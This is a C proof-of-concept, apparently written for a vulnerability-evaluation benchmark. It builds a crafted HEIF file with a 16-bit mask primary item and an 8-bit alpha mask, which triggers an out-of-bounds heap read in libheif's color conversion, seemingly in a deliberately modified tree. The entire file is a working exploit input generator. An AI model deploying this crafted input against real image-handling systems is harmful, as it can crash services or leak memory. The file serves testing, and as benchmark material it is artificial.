/*
 * PoC for the evaluation case: heap-buffer-overflow (OOB read) in the
 * color-conversion pipeline of libheif, reached through the public API.
 *
 * The input is a well-formed HEIF file that uses no image codec: the primary
 * item is a 16-bit 'mski' mask item and it carries an 8-bit 'mski' mask item
 * as its alpha auxiliary. Decoding the primary image to interleaved RRGGBBAA
 * makes the pipeline run Op_mono_to_YCbCr420 followed by
 * Op_YCbCr420_to_RRGGBBaa; the alpha plane is 8-bit while the operator reads
 * it as uint16_t samples, running past the end of the plane.
 *
 * Build: cc probe.c -I<include-dir> -L<lib-dir> -lheif
 * Clean run on the original batch; aborts under AddressSanitizer on the
 * modified tree.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include <libheif/heif.h>

/* ---------- tiny big-endian box builder ---------- */

typedef struct {
  uint8_t* d;
  size_t n, cap;
} buf;

static void bput(buf* b, const void* p, size_t n)
{
  if (b->n + n > b->cap) {
    b->cap = (b->n + n) * 2 + 64;
    b->d = realloc(b->d, b->cap);
    if (!b->d) {
      fprintf(stderr, "out of memory\n");
      exit(1);
    }
  }
  memcpy(b->d + b->n, p, n);
  b->n += n;
}

static void bu8(buf* b, uint8_t v) { bput(b, &v, 1); }
static void bu16(buf* b, uint16_t v) { bu8(b, (uint8_t)(v >> 8)); bu8(b, (uint8_t)(v & 255)); }
static void bu32(buf* b, uint32_t v) { bu16(b, (uint16_t)(v >> 16)); bu16(b, (uint16_t)(v & 0xffff)); }
static void bfourcc(buf* b, const char* s) { bput(b, s, 4); }

static void bbox(buf* b, const char* type, int full, int version,
                 const uint8_t* p, size_t n)
{
  bu32(b, (uint32_t)(8 + n + (full ? 4 : 0)));
  bfourcc(b, type);
  if (full) {
    bu8(b, (uint8_t)version);
    bu8(b, 0);
    bu8(b, 0);
    bu8(b, 0);
  }
  if (n) {
    bput(b, p, n);
  }
}

static void bfree(buf* b) { free(b->d); b->d = NULL; b->n = b->cap = 0; }

/*
 * Build a HEIF file:
 *   item 1: 'mski' primary, 64x64, 16 bits per sample
 *   item 2: 'mski' alpha auxiliary of item 1, 64x64, 8 bits per sample
 */
static size_t build_file(uint8_t** out, uint32_t w, uint32_t h)
{
  const int main_bpp = 16;
  const int alpha_bpp = 8;

  buf ftyp = {0};
  bfourcc(&ftyp, "mif1");
  bu32(&ftyp, 0);
  bfourcc(&ftyp, "mif1");
  bfourcc(&ftyp, "heic");

  buf hdlr = {0};
  bu32(&hdlr, 0);
  bfourcc(&hdlr, "pict");
  bu32(&hdlr, 0);
  bu32(&hdlr, 0);
  bu32(&hdlr, 0);
  bu8(&hdlr, 0);

  buf pitm = {0};
  bu16(&pitm, 1);

  buf iinf = {0};
  bu16(&iinf, 2);
  {
    buf infe = {0};
    bu16(&infe, 1);
    bu16(&infe, 0);
    bfourcc(&infe, "mski");
    bu8(&infe, 0);
    bbox(&iinf, "infe", 1, 2, infe.d, infe.n);
    bfree(&infe);
  }
  {
    buf infe = {0};
    bu16(&infe, 2);
    bu16(&infe, 0);
    bfourcc(&infe, "mski");
    bu8(&infe, 0);
    bbox(&iinf, "infe", 1, 2, infe.d, infe.n);
    bfree(&infe);
  }

  buf ipco = {0};
  {
    buf p = {0};
    bu32(&p, w);
    bu32(&p, h);
    bbox(&ipco, "ispe", 1, 0, p.d, p.n);  /* #1: size of item 1 */
    bfree(&p);
  }
  {
    buf p = {0};
    bu32(&p, w);
    bu32(&p, h);
    bbox(&ipco, "ispe", 1, 0, p.d, p.n);  /* #2: size of item 2 */
    bfree(&p);
  }
  {
    buf p = {0};
    bu8(&p, (uint8_t)main_bpp);
    bbox(&ipco, "mskC", 1, 0, p.d, p.n);  /* #3: item 1 is a 16-bit mask */
    bfree(&p);
  }
  {
    buf p = {0};
    bu8(&p, (uint8_t)alpha_bpp);
    bbox(&ipco, "mskC", 1, 0, p.d, p.n);  /* #4: item 2 is an 8-bit mask */
    bfree(&p);
  }
  {
    buf p = {0};
    const char* urn = "urn:mpeg:mpegB:cicp:systems:auxiliary:alpha";
    bput(&p, urn, strlen(urn) + 1);
    bbox(&ipco, "auxC", 1, 0, p.d, p.n);  /* #5: item 2 is an alpha aux */
    bfree(&p);
  }

  buf ipma = {0};
  bu32(&ipma, 2);
  bu16(&ipma, 1); bu8(&ipma, 3); bu8(&ipma, 0x81); bu8(&ipma, 0x83); bu8(&ipma, 0x84);
  bu16(&ipma, 2); bu8(&ipma, 3); bu8(&ipma, 0x82); bu8(&ipma, 0x84); bu8(&ipma, 0x85);

  buf iprp = {0};
  bbox(&iprp, "ipco", 0, 0, ipco.d, ipco.n);
  bbox(&iprp, "ipma", 1, 0, ipma.d, ipma.n);

  /* mask sample data, stored in a meta-box 'idat' (construction method 1) */
  size_t d1n = (size_t)w * h * (main_bpp / 8);
  size_t d2n = (size_t)w * h * (alpha_bpp / 8);
  uint8_t* d1 = malloc(d1n);
  uint8_t* d2 = malloc(d2n);
  if (!d1 || !d2) {
    fprintf(stderr, "out of memory\n");
    exit(1);
  }
  memset(d1, 0xAB, d1n);
  memset(d2, 0xCD, d2n);

  buf idat = {0};
  bput(&idat, d1, d1n);
  bput(&idat, d2, d2n);

  buf iloc = {0};
  bu8(&iloc, (4 << 4) | 4);
  bu8(&iloc, 0);
  bu16(&iloc, 2);
  bu16(&iloc, 1); bu16(&iloc, 1); bu16(&iloc, 0); bu16(&iloc, 1); bu32(&iloc, 0); bu32(&iloc, (uint32_t)d1n);
  bu16(&iloc, 2); bu16(&iloc, 1); bu16(&iloc, 0); bu16(&iloc, 1); bu32(&iloc, (uint32_t)d1n); bu32(&iloc, (uint32_t)d2n);

  buf iref = {0};
  {
    buf p = {0};
    bu16(&p, 2);   /* auxl reference from item 2 ... */
    bu16(&p, 1);   /* ... to one item ... */
    bu16(&p, 1);   /* ... namely item 1 */
    bbox(&iref, "auxl", 0, 0, p.d, p.n);
    bfree(&p);
  }

  buf meta = {0};
  bbox(&meta, "hdlr", 1, 0, hdlr.d, hdlr.n);
  bbox(&meta, "pitm", 1, 0, pitm.d, pitm.n);
  bbox(&meta, "iinf", 1, 0, iinf.d, iinf.n);
  bbox(&meta, "iprp", 0, 0, iprp.d, iprp.n);
  bbox(&meta, "iloc", 1, 1, iloc.d, iloc.n);
  bbox(&meta, "iref", 1, 0, iref.d, iref.n);
  bbox(&meta, "idat", 0, 0, idat.d, idat.n);

  buf file = {0};
  bbox(&file, "ftyp", 0, 0, ftyp.d, ftyp.n);
  bbox(&file, "meta", 1, 0, meta.d, meta.n);

  *out = file.d;

  bfree(&ftyp);
  bfree(&hdlr);
  bfree(&pitm);
  bfree(&iinf);
  bfree(&ipco);
  bfree(&ipma);
  bfree(&iprp);
  bfree(&iloc);
  bfree(&iref);
  bfree(&meta);
  bfree(&idat);
  free(d1);
  free(d2);

  return file.n;
}

int main(void)
{
  const uint32_t width = 64;
  const uint32_t height = 64;

  uint8_t* data = NULL;
  size_t size = build_file(&data, width, height);
  if (!data || size == 0) {
    fprintf(stderr, "failed to build the input file\n");
    return 1;
  }

  heif_context* ctx = heif_context_alloc();
  if (!ctx) {
    fprintf(stderr, "heif_context_alloc failed\n");
    free(data);
    return 1;
  }

  heif_error err = heif_context_read_from_memory_without_copy(ctx, data, size, NULL);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "read: %s\n", err.message);
    heif_context_free(ctx);
    free(data);
    return 1;
  }

  heif_image_handle* handle = NULL;
  err = heif_context_get_primary_image_handle(ctx, &handle);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "handle: %s\n", err.message);
    heif_context_free(ctx);
    free(data);
    return 1;
  }

  printf("primary item: %ux%u, alpha channel: %d, luma depth: %d\n",
         heif_image_handle_get_width(handle),
         heif_image_handle_get_height(handle),
         heif_image_handle_has_alpha_channel(handle),
         heif_image_handle_get_luma_bits_per_pixel(handle));

  /* Decode to interleaved 16-bit RGB with alpha, with default options. */
  heif_image* img = NULL;
  err = heif_decode_image(handle, &img,
                          heif_colorspace_RGB,
                          heif_chroma_interleaved_RRGGBBAA_BE,
                          NULL);
  printf("decode: code=%d sub=%d msg=%s\n", err.code, err.subcode, err.message);

  if (err.code == heif_error_Ok && img) {
    printf("output: colorspace=%d chroma=%d\n",
           (int)heif_image_get_colorspace(img),
           (int)heif_image_get_chroma_format(img));
    heif_image_release(img);
  }

  heif_image_handle_release(handle);
  heif_context_free(ctx);
  free(data);
  return 0;
}
